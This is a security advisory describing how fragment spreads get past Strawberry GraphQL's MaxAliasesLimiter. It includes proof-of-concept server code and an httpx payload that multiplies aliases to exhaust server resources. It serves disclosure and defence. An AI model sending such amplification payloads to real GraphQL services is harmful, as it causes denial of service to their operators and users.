summary: "Strawberry GraphQL's Bypass of MaxAliasesLimiter via Fragment Spreads leading to GraphQL\
  \ Alias Amplification\n### Summary\nThe MaxAliasesLimiter extension in Strawberry fails to\
  \ account for the multiplicative/amplification effect of FragmentSpreadNode. While it correctly\
  \ counts static aliases within the AST it does not consider how many times a fragments internal\
  \ aliases are expanded during execution. this allows an attacker to bypass alias limits and\
  \ force the server to resolve and render a significantly higher number of aliases than allowed,\
  \ potentially leading to a  dos via resource exhaustion.\n\n### Details\nThe current implementation\
  \ of alias counting in strawberry/extensions/max_aliases.py uses a static approach\n```\n\
  for selection in selection_set_owner.selection_set.selections: \n    if isinstance(selection,\
  \ FieldNode) and selection.alias:\n        result += 1\n\n    if isinstance(selection, (FieldNode,\
  \ InlineFragmentNode)) and ~~~:\n        result += count_fields_with_alias(selection)\n```\n\
  \nWhen a FragmentSpread is used multiple times, the actual number of aliases processed by\
  \ the execution engine is\n\n**Total Aliases = query aliases + (num of spreads * aliases within\
  \ fragment)**\n\nBecause Strawberry only performs a static sum of the text, it misses this\
  \ multiplication\n\n### PoC\n**server code**\n```\nimport strawberry\nfrom fastapi import\
  \ FastAPI\nfrom strawberry.fastapi import GraphQLRouter\nfrom strawberry.extensions import\
  \ MaxAliasesLimiter\n\n@strawberry.type\nclass User:\n    name: str = \"GONA\"\n\n@strawberry.type\n\
  class Query:\n    @strawberry.field\n    def user(self) -> User:\n        return User()\n\n\
  # Limit is set to 20 aliases\nschema = strawberry.Schema(\n    query=Query, \n    extensions=[MaxAliasesLimiter(max_alias_count=20)]\n\
  )\n\napp = FastAPI()\napp.include_router(GraphQLRouter(schema), prefix=\"/graphql\")\n```\n\
  \n**payloads**\n```\nimport httpx\n\npayload = {\n    \"query\": \"\"\"\n        fragment\
  \ Amplification on User {\n            a1: name, a2: name, a3: name, a4: name, a5: name,\n\
  \            a6: name, a7: name, a8: name, a9: name, a10: name\n        }\n        query Bypass\
  \ {\n            u1: user { ...Amplification }\n            u2: user { ...Amplification }\n\
  \            u3: user { ...Amplification }\n            u4: user { ...Amplification }\n  \
  \          u5: user { ...Amplification }\n            u6: user { ...Amplification }\n    \
  \        u7: user { ...Amplification }\n            u8: user { ...Amplification }\n      \
  \      u9: user { ...Amplification }\n            u10: user { ...Amplification }\n       \
  \ }\n    \"\"\"\n}\n\nresponse = httpx.post(\"http://127.0.0.1:8000/graphql\", json=payload)\n\
  print(f\"Status: {response.status_code}\")\n# The response will contain 100 'a' aliases nested\
  \ within 10 'u' aliases.\nprint(response.json())\n```\n\n### Impact\nAn attacker can bypass\
  \ security constraints to cause Application-level DOS. By staying just under the max_alias_count\
  \ limit in the AST an attacker can trigger thousands of actual alias resolutions on the backend\
  \ consuming excessive CPU and memory"
